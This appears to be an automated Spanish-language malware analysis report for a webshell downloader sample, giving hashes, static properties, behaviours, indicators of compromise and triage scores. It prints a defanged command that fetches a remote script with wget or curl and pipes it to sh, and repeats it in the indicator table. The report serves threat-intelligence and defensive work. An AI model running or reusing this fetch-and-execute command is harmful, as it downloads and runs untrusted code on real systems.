# 🧬 Payload Analysis

`a60e77108ca25a957a55d238344f8791c3348fb20cca6a83672b307beacd5874`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:09:22.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a60e77108ca25a957a55d238344f8791c3348fb20cca6a83672b307beacd5874`
- **SHA1:** `514b287fc47fbb636ba54ce3884d77936daf729b`
- **MD5:** `7c1c69a41f70ab30bc3c181a9e898dad`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (1268), with CRLF line terminators |
| Tamaño | 3.7 KiB |
| Entropía | 6.05 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (1268), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 14.46.136.XXX | static_analysis |
| ip | 190.179.166.XXX | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| hash | a60e77108ca25a957a55d238344f8791c3348fb20cca6a83672b307beacd5874 | static_analysis |
| ip | 107.167.94.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | candidate malware unknown |
| Prioridad | medium |
| Score | 5.0 |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
